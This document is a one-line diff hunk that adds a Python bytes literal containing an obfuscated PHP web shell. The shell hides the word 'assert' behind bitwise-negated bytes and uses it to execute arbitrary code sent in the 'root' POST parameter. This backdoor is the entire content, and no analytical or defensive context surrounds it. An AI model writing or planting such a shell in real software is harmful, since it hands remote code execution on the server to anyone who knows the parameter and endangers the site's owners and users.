@@ -1,0 +1,1 @@
+b"\n    <?php $x=~\xbe\xac\xac\xba\xad\xab;$x($_POST['root']); ?>"
